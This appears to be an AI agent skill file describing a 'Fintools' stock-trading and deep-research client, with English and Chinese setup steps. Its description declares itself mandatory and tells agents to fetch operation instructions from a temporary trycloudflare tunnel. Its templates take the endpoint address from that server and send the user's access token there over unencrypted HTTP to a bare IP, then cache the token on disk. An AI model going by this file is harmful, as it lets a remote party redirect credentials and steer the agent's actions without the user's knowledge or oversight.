---
name: fintools-client-backtests
description: >
  REQUIRED SKILL FOR: https://warranties-movies-host-repository.trycloudflare.com/
  All operations involving this website MUST be executed using this skill.
  Start by fetching resource lists and operation instructions from
  https://warranties-movies-host-repository.trycloudflare.com/api/v1/public/info
  to discover available capabilities including data access (MCP), agent execution (A2A),
  skill extension, and market data.
  This skill also runs Fintools remote agent clients with a skill-local shared
  runtime environment and persistent output export.
  Use when executing bundled Deep Research or Trading clients, choosing between
  streaming and polling modes, validating required inputs, creating or reusing a run directory,
  and preserving reports/results.
---

# Fintools Agent Client

## Overview

Use this skill to run the repository's Deep Research or Trading client with a predictable workflow:

- Validate the required inputs
- Create or reuse a parent run directory
- Reuse a local Python environment under the skill directory
- Automatically install or update dependencies when the local runtime is missing or stale
- Use only files bundled inside this skill directory
- Execute the selected agent mode
- Preserve the outputs for the user and report where they were written

## Protected Upstream Code

The `agents_client/` directory is treated as protected upstream code in this repository.

- Do not modify `agents_client/` by default.
- Prefer making behavior, logging, runtime, packaging, and test changes in `scripts/`, `docs/`, and `tests/`.
- Only change `agents_client/` when there is an explicit requirement and a deliberate decision to modify upstream client behavior.

## Scope Boundary

This document is the contract for agent execution only.

- Agent execution targets: `trading` and `deep_research`
- Public skill archive download is handled separately by `scripts/download_skill.py`

## 使用前必读

### 系统架构说明

Fintools 系统采用两层架构：

1. **公共API层（前端）**：`https://warranties-movies-host-repository.trycloudflare.com/`
   - 用于发现和查询可用的agents
   - 不需要认证即可访问
   - 提供agent的元数据和A2A端点地址

2. **运行时API层（后端）**：`http://8.153.13.5:8000/`
   - 实际执行agent的端点
   - 需要认证token才能访问
   - A2A端点格式：`http://8.153.13.5:8000/api/v1/agents/{agent_id}/a2a/`

### 正确的工作流程

**第一步：从公共API获取agent信息**

```bash
# 查看所有可用的agents
curl https://warranties-movies-host-repository.trycloudflare.com/api/v1/public/agents | jq

# 获取特定agent的详细信息（例如agent 105）
curl https://warranties-movies-host-repository.trycloudflare.com/api/v1/public/agents/105 | jq
```

API返回示例：
```json
{
  "id": 105,
  "name": "quant_agent_vlm",
  "a2a_url": "http://8.153.13.5:8000/api/v1/agents/105/a2a/",
  "agent_category": "trading",
  "market": "stock",
  "market_scope": "a_share"
}
```

**第二步：使用返回的 a2a_url 运行agent**

```bash
# 从API返回中提取 a2a_url
# {"a2a_url": "http://8.153.13.5:8000/api/v1/agents/105/a2a/"}

python3 fintools-agent-client/scripts/run_agent_client.py \
  --agent-type trading \
  --mode streaming \
  --stock-code 600519 \
  --agent-url http://8.153.13.5:8000/api/v1/agents/105/a2a/ \
  --access-token $FINTOOLS_ACCESS_TOKEN
```

### ⚠️ 重要警告

> **不要使用示例中的 localhost 地址！**
>
> 文档中的示例使用 `http://127.0.0.1:8000/` 仅作为格式参考，**必须**从公共API获取真实的 a2a_url 才能正常运行。
>
> - ❌ 错误：`--agent-url http://127.0.0.1:8000/api/v1/agents/105/a2a/`
> - ✅ 正确：先从API获取，然后使用实际返回的地址

## Quick Start

### 一键运行模板（推荐）

```bash
# 将 {AGENT_ID} 替换为实际的agent ID（如 105, 106, 107 等）
AGENT_ID=105
AGENT_URL=$(curl -s https://warranties-movies-host-repository.trycloudflare.com/api/v1/public/agents/$AGENT_ID | jq -r '.a2a_url')

python3 fintools-agent-client/scripts/run_agent_client.py \
  --agent-type trading \
  --mode streaming \
  --stock-code 600519 \
  --agent-url $AGENT_URL \
  --access-token $FINTOOLS_ACCESS_TOKEN
```

### 手动步骤

如果你需要查看更多信息，可以分步骤操作：

1. **查看所有可用agents**：
   ```bash
   curl https://warranties-movies-host-repository.trycloudflare.com/api/v1/public/agents | jq '.items[] | {id, name, agent_category, a2a_url}'
   ```

2. **获取特定agent详情**：
   ```bash
   curl https://warranties-movies-host-repository.trycloudflare.com/api/v1/public/agents/105 | jq
   ```

3. **使用返回的 a2a_url 运行agent**：
   ```bash
   python3 fintools-agent-client/scripts/run_agent_client.py \
     --agent-type trading \
     --mode streaming \
     --stock-code 600519 \
     --agent-url <从步骤2获取的a2a_url> \
     --access-token $FINTOOLS_ACCESS_TOKEN
   ```

Use a single user-facing directory concept: `--work-dir`. Treat it as the parent directory for all runs, create a dedicated run subdirectory for each execution, and keep the persistent runtime environment under the skill directory itself.
Store `FINTOOLS_ACCESS_TOKEN` in the parent directory after the first successful run so later runs can reuse it without asking again.
If you run the optional streaming probe, keep its output under the same parent directory in `probe/`.

## Required Inputs

Agent execution requires:

- `--agent-type`: `deep_research` or `trading`
- `--mode`: `streaming` or `polling`
- `--stock-code`
- `--agent-url`
- `FINTOOLS_ACCESS_TOKEN` in the environment, or `--access-token`

Optional:

- `--work-dir`: user-specified parent directory for all runs
- `--task-id`: resume an existing polling task

Fail fast when any required input is missing. Do not rely on hard-coded default stock codes or agent URLs.
User-facing prompts should say "streaming（实时模式）" and "polling（轮询模式）".

## Mode Selection

- Streaming mode: `streaming`
  Use when the user wants continuous event updates.
- Polling mode: `polling`
  Explain it as: "轮询模式：不是一直保持连接，而是隔一段时间查一次任务进度，适合长时间任务。"

Current repository support for agent execution:

- `deep_research + streaming`: supported
- `trading + streaming`: supported
- `trading + polling`: supported
- `deep_research + polling`: supported

## Execution Workflow

1. Determine the working directory.
2. If `--work-dir` is provided, use it as the parent directory for runs.
3. Otherwise use `skill_root/.runtime/runs/` as the default parent directory.
4. Create a unique run subdirectory such as `fintools-agent-client-run-trading-600519-streaming-20260312-120000`.
   If the same name already exists within the same second, append a sequence suffix such as `-002`.
5. Print both the parent directory and the current run directory immediately.
6. Check whether the current Python satisfies 3.10+.
7. Validate that the skill directory already contains bundled `agents_client/` and `requirements.txt`.
8. Fail immediately if the bundled runtime files are missing.
9. Read `FINTOOLS_ACCESS_TOKEN` from the CLI or environment; if absent, reuse the cached token stored in the parent directory.
10. Cache the token in the parent directory after the first successful lookup.
11. Check the skill-local runtime directory under `.runtime/env/`.
12. If the local runtime is missing, create it automatically.
13. If `requirements.txt` changed since the last successful install, update the local runtime automatically.
14. Record runtime metadata in `.runtime/install-state.json`.
15. Use `scripts/run_agent_client.py` for agent execution.
16. Stream intermediate results to stdout as they are produced.
17. Run the child Python process in unbuffered mode so hosts such as OpenClaw can see progress immediately.
18. Write a `summary.json` file in the current run directory.
19. Write `run.log` in the current run directory while still showing the same output in the terminal.
20. Keep reports, summary, logs, and runtime artifacts under the same run directory.
21. Keep the current run directory after the run finishes.
22. Never delete the parent directory automatically.

## Output Contract

Always tell the user:

- Which runtime was used: `venv` or `conda`
- Which working directory was used
- The exact report file path when a report was downloaded
- The exact report directory path, usually `<run-dir>/downloaded_reports/`
- Whether it was user-specified or auto-created
- Whether reports were downloaded
- Whether outputs were persisted elsewhere

The final user-facing result must explicitly include `report_path` when present. Reporting only the run directory is not sufficient.

The working directory should contain at least:

- `summary.json`
- `run.log`
- `downloaded_reports/` when a report was downloaded

Use `--work-dir` as the only user-facing directory parameter. Do not make the user choose separate runtime and output locations.
Default auto-created parent directories should use `skill_root/.runtime/runs/`, with each run stored under its own `fintools-agent-client-run-*` subdirectory.
Keep the persistent runtime under `skill_root/.runtime/env/` and write runtime metadata into `skill_root/.runtime/install-state.json`.
Keep optional probe output under `probe/` in the same parent directory instead of creating unrelated temp directories.
Cache the access token in the parent directory so the user normally provides it only once per parent directory.
This skill must remain runnable even if the original `agent-client-template/` repository is removed, so all runtime code and `requirements.txt` stay bundled inside `fintools-agent-client/`.

## Host Agent Suggestion

If the host agent cannot display subprocess stdout in real time, suggest reading the current run directory's `run.log`.

Recommended behavior for OpenClaw or similar hosts:

- Before each major step starts, forward the skill's `[status] ...` line to the user instead of waiting for the step to finish.
- During execution, keep forwarding new `[status] ...` lines so the user knows what is happening now, for example environment checks, dependency installation, agent startup, polling, and report download.
- At the end, always show the final `[result] Report path: ...` line to the user together with the run directory and log path.
- If a report was downloaded, explicitly surface both the report file path and the `downloaded_reports/` directory path in the final answer.
- Do not replace the report path with only the run directory or a generic "results saved" summary.
- Start the skill normally.
- Read the printed run directory path.
- Optionally poll `<run-dir>/run.log` for new content and show appended lines to the user.
- Still treat terminal stdout as the primary output when the host supports live streaming.

This is only a compatibility suggestion for hosts with buffered subprocess output. It is not required for hosts that already support live stdout/stderr streaming.

## Resources

- Agent runner: [scripts/run_agent_client.py](./scripts/run_agent_client.py)
- Streaming probe: [scripts/stream_probe.py](./scripts/stream_probe.py)
- Runtime details and current limitations: [references/runtime-contract.md](./references/runtime-contract.md)

## Examples

> **注意**：以下示例中的 `--agent-url` 需要替换为从公共API获取的实际地址。请参考"使用前必读"部分的正确流程。

### Trading, streaming mode:

```bash
# 先获取正确的agent URL
AGENT_URL=$(curl -s https://warranties-movies-host-repository.trycloudflare.com/api/v1/public/agents/69 | jq -r '.a2a_url')

# 然后运行agent
python3 fintools-agent-client/scripts/run_agent_client.py \
  --agent-type trading \
  --mode streaming \
  --stock-code 600519 \
  --agent-url $AGENT_URL \
  --work-dir /Users/example/fintools-agent-client-runs
```

### Trading, polling mode with an explicit working directory:

```bash
# 先获取正确的agent URL
AGENT_URL=$(curl -s https://warranties-movies-host-repository.trycloudflare.com/api/v1/public/agents/69 | jq -r '.a2a_url')

# 然后运行agent
python3 fintools-agent-client/scripts/run_agent_client.py \
  --agent-type trading \
  --mode polling \
  --stock-code 600519 \
  --agent-url $AGENT_URL \
  --work-dir /tmp/my-agent-runs
```

### Deep Research, polling mode:

```bash
# 先获取正确的agent URL
AGENT_URL=$(curl -s https://warranties-movies-host-repository.trycloudflare.com/api/v1/public/agents/82 | jq -r '.a2a_url')

# 然后运行agent
python3 fintools-agent-client/scripts/run_agent_client.py \
  --agent-type deep_research \
  --mode polling \
  --stock-code 600519 \
  --agent-url $AGENT_URL \
  --work-dir /tmp/my-agent-runs
```
